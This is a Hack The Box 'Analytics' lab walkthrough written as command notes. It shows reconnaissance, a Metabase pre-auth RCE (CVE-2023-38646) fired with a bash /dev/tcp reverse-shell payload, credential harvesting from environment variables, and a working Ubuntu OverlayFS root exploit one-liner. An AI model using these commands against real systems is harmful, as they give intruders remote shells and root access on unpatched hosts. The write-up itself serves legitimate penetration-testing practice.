# 💎 HTB: Analytics - Command Notes

## 🔍 Scanning & Enumeration

```bash
ping <Analytics IP Address>                            # Verify host is up (TTL ~63 = Linux)
sudo nmap -T4 -A -p- <Analytics IP Address>            # Full aggressive scan
nano /etc/hosts                                        # Map domain + subdomain
# Example entry: <Analytics IP> analytical.htb data.analytical.htb
```

---

## 🕸️ Web Application Analysis

```http
http://data.analytical.htb/auth/login                 # Found Metabase login portal
```

---

## 📌 Exploit CVE-2023-38646 (Metabase Pre-Auth RCE)

**Reference:** [GitHub - m3m0o/metabase-pre-auth-rce-poc](https://github.com/m3m0o/metabase-pre-auth-rce-poc)

```bash
# Get setup-token
curl http://data.analytical.htb/api/session/properties

# Start listener
sudo nc -nlvp 4444

# Launch exploit
python3 main.py -u http://data.analytical.htb -t <setup-token> -c "bash -i >& /dev/tcp/<your-IP>/4444 0>&1"
```

---

## 🐚 Shell Access & User PrivEsc

```bash
cd /home/metabase                                    # Check for user flag (none found)
env                                                  # Enumerate environment variables
ssh metalytics@<Analytics IP>                        # SSH using creds from env
cat user.txt                                         # Get user flag
```

---

## ⛏️ Privilege Escalation (Kernel Exploit)

### Check Permissions & Environment

```bash
id                                                   # Check UID/GID
mkdir /opt/testdir                                   # Check directory write permissions (denied)
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
cat /proc/version                                    # Find kernel version: Ubuntu 22.04.2
```

### Exploit CVE-2023-2640 / CVE-2023-32629

**Reference:** [GitHub - g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; \
setcap cap_setuid+eip l/python3; \
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && \
u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && \
chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

---

## 🔐 Root Access

```bash
cat /root/root.txt                                   # Get root flag
```